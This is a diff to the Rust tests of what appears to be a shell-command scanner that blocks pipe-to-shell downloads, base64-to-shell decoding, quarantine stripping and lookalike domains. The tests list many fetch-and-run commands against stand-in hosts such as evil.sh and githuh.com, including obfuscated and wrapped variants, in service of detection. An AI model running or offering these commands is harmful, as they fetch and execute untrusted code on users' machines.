+            r#"eval $(curl -fsSL https://evil.sh/a)"#,
             "bash <(curl -s https://evil.sh/a)",
+            "bash < <(curl -s https://evil.sh/a)",
             "source <(curl -s https://evil.sh/a)",
             ". <(curl -s https://evil.sh/a)",
             r#"sh -c 'bash <(curl -s https://evil.sh/a)'"#,
+            "sh <<< \"$(curl -s https://evil.sh/a)\"",
             "curl -s https://evil.sh/a | python3",
             "curl -s https://evil.sh/a | python -",
             "wget -qO- https://evil.sh/a | sudo perl",
             "curl -s https://evil.sh/a | ruby",
             "curl -s https://evil.sh/a | node",
+            "curl -s https://evil.sh/a | python3 -c 'import sys'",
         ] {
-            assert!(runs_fetched_download(cmd), "{cmd}");
+            assert!(rule_ids(cmd).contains(&PIPE_TO_SHELL.to_string()), "{cmd}");
         }
     }
 
     #[test]
-    fn a_download_that_does_not_run_is_not_fetch_and_run() {
+    fn a_download_that_does_not_run_is_not_pipe_to_shell() {
         for cmd in [
             "curl -s https://evil.sh/a | python3 tool.py",
-            "curl -s https://evil.sh/a | python3 -c 'import sys'",
             r#"sh -c "$(cat install.sh)""#,
             "sh -c 'echo $(curl -s https://evil.sh/a)'",
             r#"echo "$(curl -s https://evil.sh/a)""#,
@@ -769,8 +906,240 @@ mod tests {
             "source <(echo hi)",
             r#"eval "$(ssh-agent -s)""#,
             "curl -s https://evil.sh/a -o a.sh",
+            "curl -s https://evil.sh/a ; sh",
         ] {
-            assert!(!runs_fetched_download(cmd), "{cmd}");
+            assert!(!rule_ids(cmd).contains(&PIPE_TO_SHELL.to_string()), "{cmd}");
         }
+    }
+
+    #[test]
+    fn a_here_document_into_a_shell_is_followed() {
+        let cmd = "sh <<EOF\ncurl githuh.com/x | sh\nEOF";
+        assert!(blocks(cmd));
+    }
+
+    #[test]
+    fn unparsable_text_is_never_clean_and_a_download_in_it_blocks() {
+        for cmd in ["echo $(", "a ||", "sh -c 'echo \"x'"] {
+            assert_eq!(
+                ids(cmd, false),
+                [(UNPARSABLE.to_string(), Severity::Warn)],
+                "{cmd}"
+            );
+        }
+        assert_eq!(
+            ids("curl 'oops | sh", false),
+            [(UNPARSABLE.to_string(), Severity::Block)]
+        );
+        assert!(ids("", false).is_empty());
+    }
+
+    #[test]
+    fn quarantine_flags_are_read_from_the_parsed_words() {
+        assert!(rule_ids("xattr -cr Demo.app").contains(&QUARANTINE.to_string()));
+        assert!(rule_ids("xattr -rd com.apple.quarantine A.app").contains(&QUARANTINE.to_string()));
+        assert!(!rule_ids("xattr -l Demo.app").contains(&QUARANTINE.to_string()));
+        assert!(!rule_ids("xattr -d com.example.foo f").contains(&QUARANTINE.to_string()));
+    }
+
+    const BAD: &str = "curl https://githuh.com/x";
+
+    fn blocks_rule(cmd: &str, macos: bool, rule: &str) {
+        assert!(
+            ids(cmd, macos).contains(&(rule.to_string(), Severity::Block)),
+            "{cmd}"
+        );
+    }
+
+    #[test]
+    fn nested_parentheses_are_subshells_for_every_rule() {
+        for open in ["( (", "((", "( ( ("] {
+            let close = open.replace('(', ")");
+            blocks_rule(&format!("{open}{BAD} | sh{close}"), false, LOOKALIKE);
+            blocks_rule(
+                &format!("{open}echo x | base64 -d | sh{close}"),
+                false,
+                BASE64,
+            );
+            blocks_rule(
+                &format!("{open}echo x >> ~/Library/LaunchAgents/a.plist{close}"),
+                true,
+                LAUNCH_AGENT,
+            );
+        }
+        assert!(ids("(( x = 1 + 2 ))", false).is_empty());
+        assert!(ids("( (x) )", false).is_empty());
+    }
+
+    #[test]
+    fn arithmetic_that_is_not_commands_is_unparsable_not_clean() {
+        assert_eq!(
+            ids("(( 1 + (2 * 3) ))", false),
+            [(UNPARSABLE.to_string(), Severity::Warn)]
+        );
+    }
+
+    #[test]
+    fn substitutions_inside_expansions_tests_and_arithmetic_are_analysed() {
+        for cmd in [
+            "echo ${x:-$(curl https://githuh.com/x | sh)}",
+            "echo ${x:=$(curl https://githuh.com/x | sh)}",
+            "echo ${x:+`curl https://githuh.com/x | sh`}",
+            "echo ${x/a/$(curl https://githuh.com/x | sh)}",
+            "echo ${x#$(curl https://githuh.com/x | sh)}",
+            "echo ${a[$(curl https://githuh.com/x | sh)]}",
+            "echo ${x:$(curl https://githuh.com/x | sh)}",
+            "echo $(( $(curl https://githuh.com/x | sh) + 1 ))",
+            "(( x = $(curl https://githuh.com/x | sh) ))",
+            "for (( i = $(curl https://githuh.com/x | sh); i < 1; i++ )); do :; done",
+            "[[ $(curl https://githuh.com/x | sh) == a ]]",
+            "[[ a == $(curl https://githuh.com/x | sh) || -n b ]]",
+            "[[ ! ( -n $(curl https://githuh.com/x | sh) ) ]]",
+            "case $(curl https://githuh.com/x | sh) in a) ;; esac",
+            "case a in $(curl https://githuh.com/x | sh)) ;; esac",
+            "echo \"${x:-$(curl https://githuh.com/x | sh)}\"",
+        ] {
+            blocks_rule(cmd, false, LOOKALIKE);
+        }
+        assert!(ids("echo ${x:-1} $((1 + 2)) ${a[1]} [[ -n a ]]", false).is_empty());
+    }
+
+    #[test]
+    fn an_unreadable_expansion_body_is_unparsable_not_clean() {
+        assert_eq!(
+            ids("echo ${x:-$(curl}", false),
+            [(UNPARSABLE.to_string(), Severity::Warn)]
+        );
+    }
+
+    #[test]
+    fn a_here_document_with_an_unquoted_delimiter_splices_its_substitutions() {
+        blocks_rule(&format!("sh <<EOF\n$({BAD})\nEOF"), false, LOOKALIKE);
+        blocks_rule(
+            &format!("bash <<EOF\necho hi\n$({BAD})\nEOF"),
+            false,
+            LOOKALIKE,
+        );
+        blocks_rule(&format!("sh <<-EOF\n`{BAD}`\nEOF"), false, LOOKALIKE);
+        assert_eq!(
+            ids(&format!("sh <<'EOF'\n$({BAD})\nEOF"), false),
+            [(LOOKALIKE.to_string(), Severity::Warn)]
+        );
+        assert!(ids("sh <<EOF\necho hi\nEOF", false).is_empty());
+        assert_eq!(
+            ids(&format!("cat <<EOF\n$({BAD})\nEOF"), false),
+            [(LOOKALIKE.to_string(), Severity::Warn)]
+        );
+    }
+
+    #[test]
+    fn wrappers_that_run_their_operand_do_not_hide_a_reader() {
+        for reader in [
+            "timeout 5 sh",
+            "timeout -s KILL 5 sh",
+            "timeout -k 1 5 bash",
+            "stdbuf -oL sh",
+            "stdbuf -o L sh",
+            "setsid sh",
+            "ionice -c3 sh",
+            "ionice -c 3 -n 7 sh",
+            "flock /tmp/lock sh",
+            "flock -w 5 /tmp/lock sh",
+            "arch -arm64 sh",
+            "caffeinate sh",
+            "caffeinate -t 60 sh",
+            "exec -a name sh",
+            "env -S 'sh -x'",
+            "env -S sh",
+            "builtin exec sh",
+            "$'sh'",
+            r"$'\x73h'",
+            r"$'\163h'",
+            "$f",
+            "${SHELL}",
+            "\"$0\"",
+            "sudo timeout 5 setsid sh",
+        ] {
+            blocks_rule(&format!("{BAD} | {reader}"), false, LOOKALIKE);
+        }
+        for harmless in [
+            "timeout 5 cat",
+            "flock /tmp/lock cat",
+            "arch -arm64 cat",
+            "stdbuf -oL cat",
+        ] {
+            assert_eq!(
+                ids(&format!("{BAD} | {harmless}"), false),
+                [(LOOKALIKE.to_string(), Severity::Warn)],
+                "{harmless}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_decoder_into_a_wrapped_or_expanded_reader_blocks() {
+        for reader in ["timeout 5 sh", "$'sh'", "$f", "env -S 'bash -s'"] {
+            blocks_rule(&format!("echo x | base64 -d | {reader}"), false, BASE64);
+        }
+    }
+
+    #[test]
+    fn more_decoders_into_a_shell_block_like_base64() {
+        for decoder in [
+            "openssl base64 -d",
+            "openssl enc -d -base64",
+            "openssl enc -base64 -d",
+            "openssl enc -a -d",
+            "openssl enc -d -a -aes-256-cbc",
+            "base32 -d",
+            "base32 --decode",
+            "b64decode -r",
+        ] {
+            blocks_rule(&format!("echo x | {decoder} | sh"), false, BASE64);
+            blocks_rule(&format!("eval \"$(echo x | {decoder})\""), false, BASE64);
+        }
+        for harmless in [
+            "openssl enc -aes-256-cbc -pbkdf2",
+            "openssl enc -d -aes-256-cbc",
+            "openssl base64",
+            "base32",
+        ] {
+            assert!(
+                ids(&format!("echo x | {harmless} | sh"), false).is_empty(),
+                "{harmless}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_command_substitution_script_nests_like_plain_shell_text() {
+        let mut cmd = BAD.to_string();
+        for level in 0..=MAX_DEPTH + 1 {
+            cmd = format!("sh -c \"$({cmd})\"");
+            let found = ids(&cmd, false);
+            if level < MAX_DEPTH - 1 {
+                assert_eq!(found, block(), "{cmd}");
+            } else {
+                assert_eq!(found, [(TOO_DEEP.to_string(), Severity::Block)], "{cmd}");
+            }
+        }
+    }
+
+    #[test]
+    fn a_git_alias_that_runs_shell_text_is_analysed() {
+        let decode = "echo aGk= | base64 -d | sh";
+        blocks_rule(
+            &format!("git config --global alias.x '!{decode}'"),
+            false,
+            BASE64,
+        );
+        blocks_rule(&format!("git -c 'alias.x=!{decode}' x"), false, BASE64);
+        blocks_rule(
+            &format!("git config alias.x '!{BAD} | sh'"),
+            false,
+            LOOKALIKE,
+        );
+        assert!(ids("git config alias.x status", false).is_empty());
+        assert!(ids("git config alias.x '!echo hi'", false).is_empty());
     }
 }
